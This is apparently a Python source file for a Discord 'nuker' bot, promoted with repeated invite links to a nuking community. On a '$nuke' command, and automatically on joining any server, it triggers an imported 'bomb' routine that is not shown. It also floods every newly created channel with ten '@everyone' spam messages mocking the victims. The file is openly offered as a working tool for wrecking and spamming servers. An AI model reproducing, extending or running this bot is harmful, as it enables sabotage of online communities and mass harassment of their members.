import discord, random, json, os
from discord.ext import commands
from utili import printMessage, bomb

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")

os.system("title Simple N$ker / Made by nukerdev - https://discord.gg/6pCbgbYWM7")

# https://discord.gg/6pCbgbYWM7

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$", intents=intents)

# https://discord.gg/6pCbgbYWM7

if not os.path.exists("config.json"):
    with open("config.json", "w") as f:
        f.write('{"token": "BOT TOKEN HERE", "nuke_on_join": true}')
        printMessage(f"Created config.json file!")

# https://discord.gg/6pCbgbYWM7

with open("config.json", "r") as f:
    config = json.load(f)
    nuke_on_join = config["nuke_on_join"]

# THIS IS A SIMPLE NUKER
# ITS NOT FAST BUT IT WORKS! 
# JOIN HERE FOR A FAST N$KER : https://discord.gg/6pCbgbYWM7

@bot.event
async def on_ready():

    printMessage("""
        
| Made by nukerdev |
Join https://discord.gg/6pCbgbYWM7 for better bots and tools!
        
    """)
    printMessage(f"Logged in as {bot.user}")

# https://discord.gg/6pCbgbYWM7
 
@bot.command()
async def nuke(ctx):

    # https://discord.gg/6pCbgbYWM7
    
    await ctx.message.delete()
    await bomb(ctx.author)
    printMessage("N$ke Command executed!")

# https://discord.gg/6pCbgbYWM7


@bot.event
async def on_guild_join(guild: discord.Guild):
    if nuke_on_join == True:
        await bomb(guild.get_member(bot.user.id))
        printMessage("Join on N$ke executed!")

@bot.event
async def on_guild_channel_create(channel):
    
# https://discord.gg/6pCbgbYWM7
 
    for i in range(10):
        messages = ["GOT BOMBED 💣💣💣", "N$KE COMMUNITY ON TOP | https://discord.gg/6pCbgbYWM7", "YOU GOT N$KED IN YEAR 2024 😂"]
        random_message = random.choice(messages)
        try:
            await channel.send(f"{random_message} ||@everyone||")
        except discord.errors.Forbidden:
            printMessage(f"no perm.")

# https://discord.gg/6pCbgbYWM7
 
if __name__ == "__main__":
    try:
        bot.run(config["token"])
    except discord.errors.LoginFailure:
        printMessage(f"Invalid token.")
        exit()

# https://discord.gg/6pCbgbYWM7